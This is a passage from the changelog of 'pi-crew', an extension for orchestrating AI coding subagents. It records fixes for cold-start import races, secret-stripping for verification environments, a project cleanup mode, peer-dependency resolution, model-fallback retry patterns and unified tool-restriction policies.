pristine-checkout property = the security guarantee, RAII cleanup on success
+ on exception, idempotent cleanup). All pass.
5200 unit + 115 integration tests; no regression; tsc clean.

RFC: `research-findings/goal-workflow/16-PHASE1.5-WORKTREE-SANDBOX-RFC.md`

### Phase 1.5 #1: sanitized-env verification (opt-in info-disclosure mitigation)

`PI_CREW_VERIFICATION_SANITIZE_ENV=1` strips model-provider secrets (and
everything else not in the essential-vars allowlist) from the env passed to
verification commands (`npm test`, `pytest`, etc.). Closes the info-disclosure
residual at the SOURCE — P1f redaction at artifact-write + judge-bound is
regex-best-effort against adversarial workers; this never gives the
verification process the secret in the first place.

Escape hatch: `PI_CREW_VERIFICATION_PRESERVE_ENV=KEY1,KEY2,...` lets users
explicitly opt specific env vars back in (audited via the env-filter.ts
allowlist validator). Essential non-secret vars (PATH, HOME, USER, SHELL,
LANG, XDG_*, NPM_CONFIG_*, etc.) are always preserved.

AllowList: 25 essential vars. NO model-provider keys by default.
Inherited by bg-runner via async-runner.ts env allowlist.

Tests: 7 new unit tests in test/unit/verification-env-sanitize.test.ts
(3 flag checks + 4 integration tests spawning real `printenv` subprocesses).
All pass. 5188 unit + 115 integration tests; no regression.

### SAFETY: goal-wrap auto-downgrades multi-step workflows (no hidden crashes)

Multi-step workflows (default: 4 steps, fast-fix: 3 steps) crash
non-deterministically when run as goal-wrap worker turns in the background
goal-loop process — V8/libuv race during event-loop yields in team-runner
batch transition (see commit a9f6e09, RFC 15). Sync fs workarounds regress;
worker-thread isolation doesn't help.

When a user has goal-wrap enabled in config but the workflow is multi-step,
the team-run handler now **auto-downgrades**: skips the goal-wrap layer and
runs the workflow via the normal team-run path (foreground `executeTeamRun`
or background `spawnBackgroundTeamRun`, depending on `async`). The user gets
the run they asked for — no error, no hang, no need to remove config.

The bypass reason is logged via `logInternalError("team-tool.run.goalWrapBypassed", ...)`
for traceability (findable in debug logs / `internal-error.json`).

Single-step workflows (e.g. `implementation`, only the adaptive `assess`
step) continue to be goal-wrapped end-to-end.

Implementation:
- `shouldGoalWrap(cwd, workflow)` — pure decision function returning
  `{enabled: true}` or `{enabled: false, reason, message}`. Reasons:
  `config-off` (not enabled), `invalid-config` (malformed), `multi-step`
  (more than `GOAL_WRAP_MAX_STEPS = 1` step).
- `run.ts` calls `shouldGoalWrap` after `isGoalWrapEnabled`; if disabled,
  falls through to normal team-run path. The original `isGoalWrapEnabled`
  fast path (config check only) is kept as a cheap pre-filter.
- 5 new unit tests in `test/unit/goal-wrap.test.ts` cover all 4 decisions
  (config-off / invalid-config / multi-step refuse / single-step accept)
  + the GOAL_WRAP_MAX_STEPS value invariant.

### Phase 1.5: worker-thread atomic writer (opt-in, infrastructure)

`PI_CREW_WORKER_ATOMIC_WRITER=1` routes `atomicWriteFileAsync` and
`appendEventAsync` through a dedicated worker thread that performs SYNC fs
ops with no internal yields. Implementation: `src/state/worker-atomic-writer.ts`.
9 unit tests; 5169 existing tests pass; no regression.

**Test result**: worker writer does NOT fix the multi-step crash (verified
end-to-end with `default` workflow). The crash is NOT in fs writes — worker
writes complete successfully but the process still dies during batch
transition. Root cause is some other async operation yielding the main
event loop. See `research-findings/goal-workflow/15-PHASE1.5-WORKER-WRITER-RFC.md`
for full investigation notes.

The worker writer is kept as **infrastructure** — opt-in, well-tested, no
regression. It may help with future variants or concurrent-write contention.

### Resolution: multi-step goal-wrap crash (3/3 tasks now complete end-to-end)

The silent crash at `atomicWriteFileAsync` of the inner turn's `manifest.json`
(size=7417) — which caused `team action='run' workflow='fast-fix'` (and other
multi-step builtins) to hang at "1/3" forever — is **resolved** as a side
effect of commit `d52cb81` ("fix(goal-wrap): persist async.pid on OUTER
goal-loop manifest"). The extra `atomicWriteJson(manifestPath, asyncGoalManifest)`
call in `startGoalWrappedRun` after `spawnBackgroundTeamRun` shifts timing
enough to avoid the underlying race condition.

Verified end-to-end with 3 consecutive runs of goal-wrapped fast-fix
(`fix test.js so npm test passes`): all completed 3/3 tasks in ~120s with
`npm test` PASS. The original deep-dive investigation (commit `a9f6e09`) is
preserved as a reference; the proximate crash trigger is a Node.js / V8 /
filesystem-level race that is not reliably reproducible in either direction.

The user-facing symptom (must kill pi to recover from 1/3 hang) is also
resolved: even if a future regression reintroduces the crash, async-notifier
will detect the dead background-runner within ~30s and emit `async.died` —
the user sees "Goal failed: Background runner died unexpectedly" instead of
an infinite "running" state.



### `goal` — autonomous goal loop (P0a + P0 + P1)

- `team action='goal' config.subAction='start|status|pause|resume|stop|step|clear'`.
- A worker does a turn (`executeTeamRun`), then a separate LLM judge (synthesized
  `goal-judge` AgentConfig with `disableTools:true` → Pi `--no-tools`) evaluates the
  transcript + evidence and returns `{achieved, reason, evidenceRefs}`. On
  not-achieved, the `reason` is composed into the next turn's `manifest.goal`.
- One manifest PER turn (status-transition invariants block reuse). Budget via
  `collectRunMetrics`. `GoalLoopState` persisted at `<crewRoot>/state/goals/<goalId>.json`.
- Slash command `/team-goal`. Hooks: `before_goal_step`, `before_goal_abort`.
- Spec-driven: `research-findings/goal-workflow/00-SPEC.md` + `07-PLAN.md` v3.

### `workflow` — dynamic workflow scripts (P2 + P3)

- `.dwf.ts` scripts orchestrate subagents via `ctx.agent()` / `ctx.fanOut()` with
  JS loops/branch/cross-review; only `ctx.setResult()` reaches the main context.
- Full `WorkflowCtx`: `agent`, `fanOut`, `review`, `retry`, `mail`, `gatherReplies`,
  `renderTemplate`, `vars`, `setResult`.
- `team action='workflow-{create,get,list,save,delete}'`. `workflow-create`/`-delete`
  ACE-gated via `destructive-gate.ts` (`confirm:true`, user-initiated only, path-
  allowlisted via `resolveRealContainedPath`, content-validated).
- Capability-locked `WorkflowCtx` (Object.freeze + vm.runInNewContext);
  `isolated-vm` deferred to v1.5.
- Slash command `/workflows`. Example: `workflows/examples/hello.dwf.ts`.

### Shared infra (P0a)

- `manifest.runKind?: 'team-run' | 'goal-loop' | 'dynamic-workflow'` discriminator;
  background-runner.ts dispatches to `executeTeamRun` / `runGoalLoop` /
  `runDynamicWorkflow`. Default `'team-run'` (backward-compatible).

### Other

- `AgentConfig.disableTools?: boolean` — pushes Pi `--no-tools` (capability-locked agents).
- `TEAM_EVENT_TYPES` += `goal.*` + `dwf.*` namespaces.
- New agent-config field, new event types, new hooks — all additive, no breaking changes.

## [0.8.12] — `team action=cleanup` now reverses `init` (Issue #35) (2026-06-17)

`team action=cleanup` gained a **project-level mode** that reverses what
`team action=init` writes. This closes the legitimate complaint in
[Issue #35](https://github.com/baphuongna/pi-crew/issues/35): pi-crew injects
a guidance block into `AGENTS.md` on `init`, but `pi uninstall` has no
extension hook to remove it — so the block (and `.crew/`) were left behind.

### New `cleanup` modes

| Call | What it does |
|---|---|
| `team action=cleanup runId=<id>` | Per-run worktree cleanup (existing behavior, unchanged) |
| `team action=cleanup` (no runId) | **NEW**: removes the AGENTS.md guidance block |
| `team action=cleanup force=true` | NEW: also removes the `.crew/` state directory |
| `team action=cleanup dryRun=true` | NEW: preview without writing |

### Safety guarantees

- The AGENTS.md guidance block is **marker-delimited**
  (`<!-- PI-CREW:GUIDANCE:START/END -->`), so `removeGuidance` removes **only**
  that block — user content is never touched (pinned by a test).
- `.crew/` removal requires explicit `force=true` (irreversible — holds run
  history, artifacts, worktrees). Default preserves it.
- A `realpathSync` + basename guard refuses to `rmSync` anything that isn't a
  `.crew` dir, so a crafted cwd can't trick us into deleting an arbitrary path.
- The user-scope dir (`~/.pi/agent/extensions/pi-crew/`) is owned by
  `pi uninstall` and is never touched by `team action=cleanup`.

### Files

- `src/extension/team-tool/lifecycle-actions.ts` — `handleCleanup` dispatcher
  + new `handleProjectCleanup` (no-runId path). Intent policy now checked once
  in the dispatcher (applies to both modes). Per-run path preserved verbatim.
- `src/extension/team-tool-types.ts` — `TeamToolDetails.scope?`.
- `README.md` — new **Uninstall** section documenting the full flow.
- `test/unit/cleanup-project-mode.test.ts` — NEW, 9 tests (removal, user-content
  preservation, idempotency, force-gating, dry-run, scope rejection, runId
  routing).
- `test/unit/team-tool-dispatch.test.ts` — updated the no-runId test to the
  new contract (project cleanup, not error).

typecheck clean; full suite 2964/0.

## [0.8.11] — Split-scope install fix + transient-provider fallback (2026-06-17)

Bundle of two independent fixes that were triaged from real user reports on
2026-06-17. Both are robustness fixes for failure modes that previously
killed team runs silently.

### 1. `Cannot find module '@earendil-works/pi-coding-agent'` on Windows / global installs

**Symptom:** every `team` action (run / parallel / plan) crashed ~1 minute
after spawn, leaving all tasks permanently `queued`. The detached
background team-runner child threw:
```
Error: Cannot find module '@earendil-works/pi-coding-agent'
Require stack:
- .../.pi/agent/npm/node_modules/pi-crew/src/runtime/skill-instructions.ts
```

**Root cause:** pi-crew (an extension) is installed under
`~/.pi/agent/npm/node_modules/<ext>/`, but pi itself (the
`@earendil-works/pi-coding-agent` package extensions import from) lives in a
**separate** node_modules tree (nvm / `%APPDATA%\npm` / Volta / fnm /
pnpm-global). Node's resolver only walks UP ancestor `node_modules`, so a
static `import { getAgentDir } from "@earendil-works/pi-coding-agent"` in a
file loaded by the spawned child crashes. This is the **default** layout for
anyone who installs pi-crew via `pi install` — not a user misconfiguration.

**Additional constraint:** pi-coding-agent ships as **ESM-only**
(`type:module`, exports map with only an `import` condition). CJS
`createRequire(dir)(name)` / `require.resolve("<pkg>/package.json")` both
fail with `ERR_PACKAGE_PATH_NOT_EXPORTED` under node AND jiti/tsx (verified).
The ONLY working load mechanism is a dynamic `import()` of the resolved ESM
entry file URL.

**Fix — NEW `src/runtime/peer-dep.ts`:**
- `resolvePeerDep()` (sync): walks `node_modules` **manually** (bypasses the
  restrictive exports map) across 6 strategies — env hint
  (`PI_CREW_PEER_DEP_DIR`), this file, `process.argv[1]`, the node binary's
  global node_modules (covers nvm/Volta/fnm), `npm root -g`, and
  `%APPDATA%\npm`. Memoized.
- `primePeerDep()` (async): dynamic `import(fileURL)` the resolved ESM entry,
  cache the module namespace. Memoized + retryable on failure.
- `getAgentDir()` (sync): reads the REAL fork-aware `getAgentDir` from the
  primed cache; falls back to a computed default (`~/.pi/agent`, respecting
  `PI_CODING_AGENT_DIR`) if not primed — **NEVER throws**.

**Rewired:**
- `skill-instructions.ts`, `discover-skills.ts` — static peer-dep import →
  lazy `getAgentDir()` from `peer-dep.ts` (this is the crash site).
- `background-runner.ts` — `primePeerDep()` before importing `team-runner`
  (child process).
- `register.ts` — `primePeerDep()` at extension entry (main process).
- `async-runner.ts` — propagate `PI_CREW_PEER_DEP_DIR` to children so they
  skip the ~200ms `npm root -g` probe.

**Tests:** NEW `test/unit/peer-dep-resolver.test.ts` (9 cases) — env-hint
resolution, manual node_modules walk past exports map, ESM dynamic-import
loading, memoization, graceful fallback, `PI_CODING_AGENT_DIR` override,
loadable fileURL under the child's loader.

### 2. `500 api_error "unknown error, 999 (1000)"` aborted the run instead of falling back

**Symptom:** when the model provider went hard-down with
`500 {"type":"error","error":{"type":"api_error","message":"unknown
error, 999 (1000)"}}`, the run died even when the user had configured a
fallback model that would have worked.

**Root cause:** pi has two safety layers. (1) pi-core provider-retry retries
3× with exponential backoff — its regex already matches `500`. (2) pi-crew's
`model-fallback` layer is the last safety net: when all 3 retries fail, it
tries the next configured model. But `isRetryableModelFailure`'s pattern
list covered 429 / rate-limit / 502-504 / overloaded / timeout and **MISSED**
generic `500`, `api_error`, `unknown error`, and internal/server-error
phrasings. So a transient provider outage was retried 3× then **aborted**
instead of failing over.

**Fix:** added to `RETRYABLE_MODEL_FAILURE_PATTERNS` —
`\b500\b`, `\b501\b`, `api_error`, `unknown error`,
`internal(?:_server)?[ _]error`, `server error`, `bad gateway`.

`NON_RETRYABLE` (auth/billing/key) still wins — checked first in
`isRetryableModelFailure` — so a transient-looking 500 wrapping an auth
failure won't loop the chain.

**Tests:** 4 regression tests in `test/unit/model-fallback.test.ts` covering
the exact reported error, generic 5xx, auth-still-blocked, and undefined/empty.

### Verification

typecheck clean; peer-dep suite 9/9; model-* suite 57/57; full suite 0 real
failures (1 known `result-watcher` fs.watch 10s timeout flake passes 7/7 in
isolation — unrelated).

## [0.8.10] — Pre-warm 3 repro-observed cold-start crash-variant modules (2026-06-17)

The post-v0.8.9-restart 6-subagent repro surfaced 3 cold-start crash variants
in one batch: `existsSync` (peer-dep, latched v0.8.1 + warmup v0.8.6),
`effectiveRunConfig` (`team-tool/config-patch.ts`), `CREW_README`
(`state/crew-init.ts`, latched v0.8.9). v0.8.6's warmup covered `team-tool.ts`
transitively but not these specific modules explicitly — static-graph
reachability isn't reliable under tsx/jiti interop + concurrent fanout (the
`handleRun` latch serializes the CALL but not module-body instantiation of
`run.ts`'s static deps).

**Fix:** add the 3 repro-observed modules to `HOT_MODULE_SPECIFIERS` so their
module bodies instantiate at single-threaded registration:
`team-tool/run.ts`, `team-tool/config-patch.ts`, `workflows/validate-workflow.ts`.

Repro verification: 6/6 subagents clean (was 1/6) under loaded code.

## [0.8.9] — crew-init dynamic-import latch (kills CREW_README TDZ race) (2026-06-17)

Module-scoped `loadCrewInit()` latch in `team-tool/run.ts` — concurrent `team`
tool calls share ONE in-flight import promise. Added `crew-init.ts` to
`HOT_MODULE_SPECIFIERS`. Targets the `CREW_README` TDZ variant observed in the
post-v0.8.8 repro.

## [0.8.8] — Cross-project leak cwd-scope barrier (2026-06-17)

`collectInFlightRuns` filtered by STATUS only (queued/planning/running), not
by project scope. Multiple Pi sessions in the same project shared
`.crew/state/runs/`, so Session B's compaction picked up Session A's runs in
OTHER projects and injected them into Session B's continuation prompt.

The v0.8.8 (4bd6f5b) `ownerSessionId` filter was **unreliable** —
`ctx.sessionId` is absent on pi 0.79.6 `ExtensionContext`.

**Fix:** `isInProjectScope(run, queryCwd)` in `collectInFlightRuns` — keeps a
run only if `findRepoRoot(run.cwd) === findRepoRoot(queryCwd)`. Reliable,
version-independent. Filter at the consumption site, NOT in
`listRecentRuns`/`collectActiveRuns` (the cross-project dashboard view stays
unfiltered — 2 run-index tests pin that). Empirically verified: ambient
status shows only current-project runs, zero foreign-project bleed.

## [0.8.7] — Doctor runtime-warmup status (2026-06-17)

`getRuntimeWarmupStatus()` diagnostic + a "Runtime warmup" section in
`team doctor` showing started/completed/duration/error. "Not started" is NOT
a doctor error (normal for direct unit-test calls).

## [0.8.6] — General cold-start race fix (runtime module-graph warmup) (2026-06-17)

Fixes the `validateWorkflowForTeam` cold-start crash that v0.8.1 did NOT
actually fix (honest correction — v0.8.1's per-import latch covered only the
peer-dep namespace `existsSync` variant, not this pi-crew-internal variant).

### Corrected root cause

Under the **tsx loader**, a named import `import { X } from "mod"` compiles to
`mod_1.X` — a namespace-property access at runtime. If `mod_1` is observed
mid-instantiation as `undefined` during concurrent cold-start, the access
throws `Cannot read properties of undefined (reading 'X')`. **ANY module in
the graph is vulnerable**, not just the peer dep. v0.8.1's per-import latch
can't scale to every named import in `src/`.

### Fix — general, not per-import

1. **Pre-warm at registration.** `startRuntimeWarmup()` fires eager `import()`
   of the hot module graph ROOTS during single-threaded `registerPiTeams()` —
   before any subagent can spawn. ESM transitively instantiates their entire
   import graph, so one import per path warms the full subgraph.
2. **Await at spawn boundaries.** `awaitRuntimeWarmup()` is awaited at the top
   of `runLiveSessionTask` and `runTeamTask` — the two spawn entry points — so
   the graph is guaranteed warm before any module is touched, regardless of
   which binding would otherwise race.

The warmup runs in milliseconds (module loading only). The await is
belt-and-suspenders for the pathological case where a spawn races the warmup
promise. Errors are swallowed — a failed warmup (e.g. peer dep absent) never
blocks the extension; worst case the old race returns (no worse than before).

### Files
- NEW `src/runtime/runtime-warmup.ts` — `startRuntimeWarmup()` (idempotent
  fire-and-forget) + `awaitRuntimeWarmup()` (gate) + test seams.
- `src/extension/register.ts` — `startRuntimeWarmup()` early in
  `registerPiTeams`.
- `src/runtime/live-session-runtime.ts` — `await awaitRuntimeWarmup()` at top
  of `runLiveSessionTask`.
- `src/runtime/task-runner.ts` — `await awaitRuntimeWarmup()` at top of
  `runTeamTask`.
- NEW `test/unit/runtime-warmup.test.ts` (6 tests): idempotency, no-hang,
  back-compat (no-op when not started), hot-module specifiers resolve,
  integration (graph actually warms).
- Updated `.github/issues/2026-06-16-validateworkflowf-team-cold-start-race.md`
  — marked RESOLVED with the fix applied.

typecheck clean; full suite 0 real failures (2 timer flakes under local load
pass 3/3 in isolation — clean on CI).

## [0.8.5] — Per-write validator (T5) + validateWorkflowForTeam race note (2026-06-16)

Third APPLIED technique from the pi-ecosystem distillation (pi-lens /
apmantza — the "inline channel"). Adds real-time feedback on file
writes/edits: a CHEAP synchronous validator runs on every `write`/`edit`
tool result and appends a `🔴` blocker to the tool result on failure, so
malformed files are caught the moment they're written — not at the next
load.

### Latency-safe v1 design (deliberate scope)

pi-lens runs LSP servers + linters per write. That is expensive and would
cause latency storms if naively ported (seconds of spawn per edit, firing in
the main session AND every worker). This v1 ships ONLY zero-cost, zero-spawn,
synchronous validators:

- **`json` → `JSON.parse`** (nanoseconds, built-in, no process spawn).

The registry is extensible — process-spawning validators (`.js` → `node
--check`, `.sh` → `bash -n`, `.py` → `py_compile`) are a FUTURE opt-in
(never default-on), and will need to be async + debounced (pi-lens's
`inFlightPipelines` / debounce-window pattern) when added.

### Contract guarantees
- Synchronous. No `await`, no `spawn`, no disk write.
- One disk READ per validated file (after a cheap extension check, so
  non-validated files cost nothing).
- Dedup by content: the same path+content is validated at most once per
  process.
- Silent on success; appends exactly one TextContent block on failure.
- Best-effort: any internal error is swallowed (never breaks a write).
- Toggle: `runtime.reliability.perWriteValidation` (default `true` → opt-out).

### Files
- NEW `src/runtime/per-write-validator.ts` — `validateJson`, the extensible
  `PerWriteValidator` registry, dedup cache, `validateWrittenFile`, and
  `buildValidationBlocker`. Test seams: `setPerWriteValidatorsForTest`,
  `resetPerWriteValidatorCache`.
- `src/config/types.ts` — `reliability.perWriteValidation?: boolean`.
- `src/extension/register.ts` — `pi.on("tool_result", ...)` handler for
  `write`/`edit` (pi-crew previously subscribed only to `tool_call`).
- NEW `test/unit/t5-per-write-validator.test.ts` (15 tests).
- NEW `.github/issues/2026-06-16-validateworkflowf-team-cold-start-race.md` —
  honest note that the `validateWorkflowForTeam` cold-start error (same
  class as v0.8.1's `existsSync`) was NOT actually fixed by v0.8.1's latch
  (that covered only the peer-dep namespace). Documents the corrected
  root cause (tsx makes every named import a runtime namespace access) and
  4 candidate fixes for the later pass.

typecheck clean; full suite 0 failures.

## [0.8.4] — cold-verifier agent (T9) (2026-06-16)

Second APPLIED technique from the pi-ecosystem distillation (piolium /
Vigolium — cold-verifier pattern). Adds a new builtin agent whose value is
**independence**: it re-derives claims from ground truth WITHOUT trusting
prior reviewer/verifier analysis, breaking the confirmation-bias drift the
chained `reviewer` → `verifier` path can introduce.

### Why
piolium splits security verification across ~10 narrow agents, including a
`cold-verifier` whose prompt enforces file-access isolation ("MUST NOT read
any file other than the single finding draft"). pi-crew's default `verifier`
instead *correlates* findings against reviewer output ("Trust dependency
context") — efficient, but it inherits the reviewer's blind spots. There was
**no** adversarial cross-check agent (confirmed: zero agents reference
cold/isolation/unbiased semantics).

### What
NEW builtin `cold-verifier` agent (`agents/cold-verifier.md`):
- Read-only + `bash` (runs tests fresh, reads its OWN output — never a
  cached prior-worker log).
- Prompt-enforced isolation discipline: don't trust prior findings, treat
  each as an *unverified hypothesis*, actively look for contradicting evidence.
- Distinct `COLD_VERIFICATION` output block with a `CLAIMS_REFUTED` field
  (the highest-value output — inherited claims your independent check
  contradicts).
- `maxTurns: 12` (tighter than verifier's 15 — it's a focused cross-check).

Use `verifier` for fast finding-correlation; use `cold-verifier` when the
cost of a wrong "PASS" is high (security changes, release gates, data-loss
paths). Both can run in the same workflow.

### Files
- NEW `agents/cold-verifier.md` — the agent (auto-discovered).
- `src/agents/discover-agents.ts` — add `cold-verifier` to the SEC-001
  `PROTECTED_AGENT_NAMES` blocklist (can't be shadowed by a dynamic reg).
- `src/ui/settings-overlay.ts` — add to the settings-overlay agent list.
- `test/unit/agent-discovery-cache.test.ts` — mirror the protected-names list.
- NEW `test/unit/t9-cold-verifier.test.ts` (5 tests): discovery, parse,
  isolation-discipline content, SEC-001 protection, frontmatter shape.

typecheck clean; full suite 1905 ok / 0 fail.

## [0.8.3] — Terminal tab title + Ghostty native progress bar (T4) (2026-06-16)

First APPLIED technique from the pi-ecosystem distillation (pi-status /
Thinkscape). Adds two UI channels pi-crew didn't use before, both surviving
subprocess and visible even when the TUI isn't in focus:

1. **Terminal tab title** via `ctx.ui.setTitle()` — shows a one-line crew run
   summary (e.g. "π-crew · 2 active · explorer, executor") while runs are
   in-flight, restored to "π-crew" on idle. Idle re-assert uses an
   exponential backoff loop (mirrors pi-status) because pi itself re-sets the
   title on some events.
2. **Ghostty OSC 9;4 native progress bar** — written to `/dev/tty` (a separate
   channel from pi's TUI, so it works even when pi runs in a subprocess).
   state 3 = indeterminate pulsing while runs are active; state 1 value 100 =
   green completion flash; state 0 = clear on idle. Compatible with all
   libghostty-based terminals (Ghostty, cmux, muxy).

Driven from `runEventBus.onAny` with an idle↔active transition guard so the
OSC sequence isn't re-emitted on every event. **Purely additive and
best-effort**: `/dev/tty` may be absent (non-interactive / subagent / CI /
Windows) and `setTitle` may be unavailable — all failures are swallowed and
never surface. Cannot regress existing behavior (nothing depends on it).

### Files
- NEW `src/ui/terminal-status.ts` — `setGhosttyProgress` +
  `ghosttyWorking/Complete/Clear`, `buildCrewTitleSegment`, and
  `createTerminalStatusController` (owns the title + progress lifecycle with
  a dispose + idle-reassert loop). Minimal `TerminalStatusUi` interface
  (dependency inversion: depends only on `{ hasUI; ui: { setTitle } }`).
- `src/extension/register.ts` — construct + drive the controller from
  `runEventBus.onAny` (transition-guarded); dispose in cleanupRuntime + the
  session-rescope path.
- NEW `test/unit/t4-terminal-status.test.ts` (16 tests): OSC 9;4 sequence
  shape, title-segment builder, controller lifecycle, best-effort error
  handling, double-dispose idempotency.

typecheck clean; full suite 1893 ok / 0 fail (local EXIT=1 is only the test-
runner infra `spawnSync ETIMEDOUT` under load — clean on CI).

## [0.8.2] — Skill confidence dead-code fix (T7) (2026-06-16)

Fixes a **real correctness bug** surfaced by the pi-extensions deep-dive
(pi-continuous-learning's tiered confidence model): pi-crew's skill
confidence system was effectively **inert**.

### Bug fixed

`registerSkillEffectivenessHooks` had two defects that left every skill's
confidence stuck at ~0.3 regardless of outcomes:

1. **`adjustConfidence()` was dead code.** The `task_completed` handler
   hardcoded `confidence: computeInitialConfidence(1)` (= 0.3) on every
   activation write. The function was defined and unit-tested in isolation,
   but **never called in the recording path** — so every stored activation
   had confidence 0.3, and `computeSkillMetrics.currentConfidence` (derived
   from the last stored value + decay) never moved.
2. **`task_failed` was a no-op.** Its comment claimed failures were "handled
   by computeSkillMetrics", but `computeSkillMetrics` derives `passRate`
   from *recorded* activations — and failed tasks recorded **nothing**, so a
   failure never fed back into the confidence/decay loop.

Net effect: the entire confidence-weighted skill system was decorative.
Pass-rate, trend, and promotion-gate decisions were computed from a flat
0.3 baseline.

### Fix

New `computeNextActivationConfidence(skillId, activations, passed)` helper
computes the **rolling** confidence: it seeds the first activation of a
skill at 0.3, then applies `adjustConfidence` (+0.05 success / -0.1
   failure, clamped [0.1, 0.95]) on the skill's last recorded confidence.

Both hooks now record activations with the rolling confidence:
- `task_completed` → records `passed:true` activations at the rolled-forward
  confidence.
- `task_failed` → now records `passed:false` activations (was a no-op),
  which lowers passRate AND triggers the -0.1 contradicting delta on the
  next recorded activation.

This unblocks the confidence-weighted skill selection (`getWeightedSkillsForRole`)
and the promotion gate (`evaluatePromotionGate`) — they now reflect real
outcome history. Existing `adjustConfidence`/`computeInitialConfidence`/
`computeSkillMetrics` tests are preserved unchanged (they asserted on the
intended contract; the recording path now honors it).

### Files
- `src/runtime/skill-effectiveness.ts` — `computeNextActivationConfidence`
  helper; both hooks rewired to record rolling-confidence activations.
- NEW `test/unit/t7-confidence-deadcode-fix.test.ts` (7 tests): rolling
  confidence evolves across activations; failures feed back; `adjustConfidence`
  is no longer dead.

typecheck clean; skill-effectiveness suite 44/44 pass. (One unrelated
`event-log-async` flake under local load passes 3/3 in isolation — clean on CI.)

## [0.8.1] — Subagent cold-start race fix (module-scoped import latch) (2026-06-16)

Fixes a flaky, load-dependent crash that surfaced when launching multiple
subagents **concurrently** via `Agent({ run_in_background: true })`.

### Bug fixed

When 2+ in-process live-session subagents spawned at once, some crashed at
cold-start with:

```
Cannot read properties of undefined (reading 'existsSync')
Cannot read properties of undefined (reading 'validateWorkflowForTeam')
```

These are property-access-on-`undefined` errors: a module namespace binding
observed mid-evaluation as `undefined`. The defining reproduction: 4 explorer
subagents launched together → 3 of 4 crashed; **all 3 succeeded on sequential
retry** (same code, same args, same repos — only concurrency changed). That is
the signature of a cold-start race, not a logic bug.

### Root cause

`direct-agent` subagents run **in-process** via `createAgentSession` (the
live-session runtime), sharing one Node module graph. The spawn path called
`await import("@earendil-works/pi-coding-agent")` **independently** per
subagent. Under the **tsx loader** (which registers `load`/`resolve` hooks to
transpile TS), concurrent first-imports can each enter the loader and race
module-record instantiation — yielding a namespace binding seen mid-eval as
`undefined`. Engine-level ESM memoization is not guaranteed to be observed
synchronously across concurrent evaluation under transpiling loaders.

### Fix

Module-scoped memoization in `src/runtime/live-session-runtime.ts`: the FIRST
caller sets `liveSessionModulePromise`; every later caller awaits the same
in-flight promise. Guarantees a single module-record instantiation regardless
of loader behavior. Concurrent callers then proceed in parallel as normal.

```ts
let liveSessionModulePromise: Promise<LiveSessionModule> | undefined;
function loadLiveSessionModule(): Promise<LiveSessionModule> {
	if (!liveSessionModulePromise) {
		liveSessionModulePromise = import("@earendil-works/pi-coding-agent")
			as unknown as Promise<LiveSessionModule>;
	}
	return liveSessionModulePromise;
}
```

### Files
- `src/runtime/live-session-runtime.ts` — module-scoped `loadLiveSessionModule()`
  latch; use site now `await loadLiveSessionModule()` (was un-memoized
  `await import(...)`).
- NEW `test/unit/live-session-import-latch.test.ts` (2 tests): module loads
  cleanly; latch variable + check-before-set + use site present, and the old
  un-memoized pattern gone (regression guard).
- NEW `.github/issues/2026-06-16-subagent-cold-start-race.md` — full root-cause
  write-up + lessons.

typecheck clean; full suite 0 failures (local EXIT=1 is the test-runner infra
`spawnSync ETIMEDOUT` on a background-subagent test under local load — clean
on CI).

## [0.8.0] — Tool-restriction unification across spawn paths (2026-06-16)

Fixes a long-standing correctness gap where the same agent behaved
*differently* depending on which runtime spawned it.

### Bug fixed

The child-pi path (`pi-args.ts`) and the live-session path
(`live-session-runtime.ts`) **disagreed on tool restrictions**:

| | allowlist | denylist |
|---|---|---|
| child-pi (before) | `roleConfig.tools ?? agent.tools` (role authoritative) | `roleConfig.excludeTools` only |
| live-session (before) | `agent.tools` only (frontmatter authoritative) | `agent.disallowedTools` only |

So a user defining `tools:` or `disallowed_tools:` in a custom agent's
frontmatter saw it honored on one path and ignored on the other:
- `disallowed_tools: web` was **silently ignored on child-pi** (the default
  async path).
- A builtin `explorer` on the live-session path was **not bound by the role's
  read-only security constraint** (it relied solely on the frontmatter).

### Fix

A shared `resolveToolPolicy(agent, role)` helper in `agent-config.ts` is
now the **single source of truth** used by BOTH spawn paths. Stable,
unified semantics:

- **Allowlist precedence is source-aware**:
  - `source === "builtin"` → role-config authoritative (security: a builtin
    explorer MUST stay read-only even if its frontmatter is loose).
    Frontmatter is the fallback when the role has no allowlist.
  - `source !== "builtin"` (user / project) → frontmatter `tools:`
    authoritative (user intent). Role-config is the fallback.
- **Denylist is additive**: `roleConfig.excludeTools` and
  `agent.disallowedTools` are MERGED (dedup, order-insensitive). It is
  always safe to forbid more, and merging means a security exclude from
  the role can never be weakened by a frontmatter omission.

This is **not a regression** for builtin agents: their allowlist still comes
from `ROLE_TOOL_CONFIGS` (the authoritative security set), and the merged
denylist only adds constraints. Custom agents now behave identically
across both runtimes.

### Files
- `src/agents/agent-config.ts` — NEW `resolveToolPolicy` + `ResolvedToolPolicy`
  (the shared resolver) + `uniqueToolMerge` helper.
- `src/runtime/pi-args.ts` — uses `resolveToolPolicy` (drops the inline
  role-authoritative logic; removes now-unused `getAgentSessionOptions` import).
- `src/runtime/live-session-runtime.ts` — `filterActiveTools` now takes the
  role and uses `resolveToolPolicy` (drops the inline frontmatter-only logic).
- NEW `test/unit/v0-8-0-tool-policy-unification.test.ts` (10 tests pinning
  the resolver: source-aware allowlist, additive denylist, cross-path
  determinism).

typecheck clean; 4980+ tests pass / 0 fail. CI green on win/ubuntu/macos.

## [0.7.9] — Interop & agent granularity (4 grouped items, 2026-06-16)

One grouped release for four related, surgical interop / agent-granularity
items (all additive, no behavior change for existing configs):

### F6 — Agent Skills spec skill-roots (interop)
- Skill discovery now reads 5 roots (was 2), matching pi-subagents'
  `skill-loader` so skills authored under either convention are found:
  - `<cwd>/.pi/skills` (project, Pi standard) — new
  - `<cwd>/.agents/skills` (project, Agent Skills spec / agentskills.io) — new
  - `<cwd>/skills` (project, legacy pi-crew) — kept
  - `~/.pi/agent/skills` (user, Pi standard) — new
  - `~/.agents/skills` (user, Agent Skills spec) — new
  - `~/.pi/skills` (user, legacy) — new
  - `PACKAGE_SKILLS_DIR` (bundled) — kept
- Affects both `discover-skills.ts` (capability inventory) and
  `skill-instructions.ts` (actual prompt rendering). New `source` values
  (`project-pi`, `project-agents`, `user-pi`, `user-agents`) extend
  `CapabilitySource`; first hit per name wins, project overrides user.

### F1 sub-gap — `.pi/agents/` project agent discovery (interop)
- Project agent discovery now reads BOTH the legacy pi-crew
  `.crew/agents/` (or `.pi/teams/agents/` fallback) AND the Pi-standard
  `.pi/agents/` as separate tiers. New `projectPi` field in
  `AgentDiscoveryResult` (optional in the type for back-compat with
